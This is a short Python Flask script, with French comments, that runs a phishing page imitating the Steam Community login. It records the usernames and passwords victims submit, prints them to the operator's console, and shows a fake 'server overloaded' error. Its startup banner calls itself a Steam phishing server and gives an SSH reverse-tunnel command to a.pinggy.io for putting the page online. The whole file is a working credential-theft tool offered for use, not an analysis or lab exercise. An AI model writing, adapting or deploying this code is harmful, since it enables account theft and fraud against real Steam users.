from flask import Flask, request, render_template_string
import time
import sys
import os

# On ne charge plus pyngrok pour éviter l'erreur "Symbol not found" sur ton Mac
app = Flask(__name__)

# --- TON CODE HTML (Je l'ai raccourci ici pour la lisibilité) ---
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Steam Community</title></head>
<body style="background-color: #1b2838; color: white; font-family: sans-serif; text-align: center;">
    <h1>Sign In</h1>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" style="margin: 10px; padding: 5px;"><br>
        <input type="password" name="password" placeholder="Password" style="margin: 10px; padding: 5px;"><br>
        <button type="submit" style="background-color: #66c0f4; color: white; border: none; padding: 10px 20px;">Login</button>
    </form>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"\n[!] DONNÉES REÇUES :")
        print(f" > Username: {username}")
        print(f" > Password: {password}")
        return "<h1>Erreur de connexion (404)</h1><p>Le serveur Steam est surchargé.</p>"
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("  SERVEUR STEAM-PHISHING ACTIVÉ (Mode Mac Intel)")
    print("="*50)
    print("\n1. Ton serveur tourne sur : http://127.0.0.1:5000")
    print("2. POUR LE METTRE EN LIGNE, ouvre un AUTRE terminal et tape :")
    print("   ssh -R 80:localhost:5000 a.pinggy.io")
    print("\n" + "="*50 + "\n")
    
    app.run(port=5000)
